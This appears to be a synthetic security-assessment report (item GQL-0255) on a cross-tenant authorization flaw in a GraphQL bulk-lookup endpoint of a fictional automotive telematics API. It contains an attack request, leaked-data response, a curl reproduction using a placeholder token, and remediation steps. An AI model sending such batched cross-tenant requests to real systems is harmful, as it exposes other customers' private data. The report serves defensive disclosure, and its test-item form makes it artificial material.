# Security Analysis Report
**System:** AetherDrive V2X Telematics — v1.1.9 (FINAL)
**Domain:** Automotive / Connected Car
**Example ID:** GQL-0255
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.3 | Semantic ambiguity via over-broad `bulkResourceLookup` — attacker batches cross-tenant telematics resource IDs in a single call |

---

## Finding 1 — Insecure Design: Semantic Ambiguity via Over-Broad Bulk Endpoint (Pattern 3.3)

### Summary
The `bulkResourceLookup` GraphQL mutation on AetherDrive V2X Telematics (`api.aetherdrive-v2x-tele.example.com`) accepts a caller-supplied array of IDs without per-ID ownership filtering. Per §5.0 Pattern 3.3, the endpoint's over-broad semantics allow an attacker authenticated to `tenant-7a27` to include IDs from `tenant-c025` in the same batch request and receive cross-tenant telematics data. The underlying `getResource` resolver (§4.0 RISK-GQL-255) performs no tenancy check, and the bulk endpoint amplifies this by processing an arbitrary number of cross-tenant IDs in one operation. In an automotive / V2X context, resource records may contain vehicle telemetry, OTA update manifests, and fleet operator PII.

**HAR artifact note:** The request uses `bulkResourceLookup(ids: ["R-2255","R-1255","R-3255"])` but the response JSON key is `getResource`. This inconsistency exists in context.txt §6.0 and is documented as-is.

**Pattern:** 3.3 — Semantic ambiguity (over-broad endpoints) (Insecure Design)
**Affected resolver:** `bulkResourceLookup(ids: [ID!]!)`
**Affected endpoint:** `POST https://api.aetherdrive-v2x-tele.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.aetherdrive-v2x-tele.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-7a27
Content-Type: application/json

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2255\", \"R-1255\", \"R-3255\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Telematics Data Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-c025",
      "ownerId": "other-user-7a27c025",
      "data": {
        "sensitiveField": "CONFIDENTIAL-7a27c025",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Note: `x-request-id: req-7a27c025` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `resourceId` only — no tenant dimension |
| §3.0 Schema | `bulkResourceLookup(ids: [ID!]!)` — no per-ID tenant filter |
| §3.0 Schema | `getResource(id: ID!)` — same missing tenancy guard |
| §4.0 RISK-GQL-255 | `getResource` resolver fetches by `resourceId` only; no tenancy check |
| §5.0 Pattern 3.3 | Over-broad endpoint — accepts any IDs without ownership validation |
| HAR request | `tenant-7a27` batches `["R-2255","R-1255","R-3255"]` spanning victim `tenant-c025` |
| HAR response | `CONFIDENTIAL-7a27c025` from `tenant-c025` returned |

---

## Steps to Reproduce

```bash
# Authenticate as attacker (tenant-7a27)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Batch lookup including victim tenant resource IDs
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.aetherdrive-v2x-tele.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-7a27" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2255\", \"R-1255\", \"R-3255\"]) { resourceId tenantId data { sensitiveField } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-7a27c025 from tenant-c025
# Expected (secure): Results filtered to tenant-7a27 only; cross-tenant IDs return null or FORBIDDEN
```

---

## Remediation

1. **Per-ID ownership filter in bulk endpoint:** In `bulkResourceLookup`, after fetching all requested IDs, filter results to only include records where `record.tenantId === $jwt.tenantId` before returning the response.
2. **Database WHERE clause:** `WHERE resource_id = ANY($ids) AND tenant_id = $jwtTenantId` — prevents cross-tenant data from being fetched at all.
3. **`getResource` resolver check:** `WHERE resource_id = $id AND tenant_id = $jwtTenantId` (§4.0 RISK-GQL-255).
4. **Cache keying:** Include `tenantId` in Redis key: `resource:{tenantId}:{resourceId}`.
5. **Automotive note:** V2X telematics records may contain real-time vehicle location, OTA firmware manifests, and fleet operator PII. Cross-tenant access to these records constitutes both a privacy breach and a potential vehicle safety risk if firmware update state is exposed.
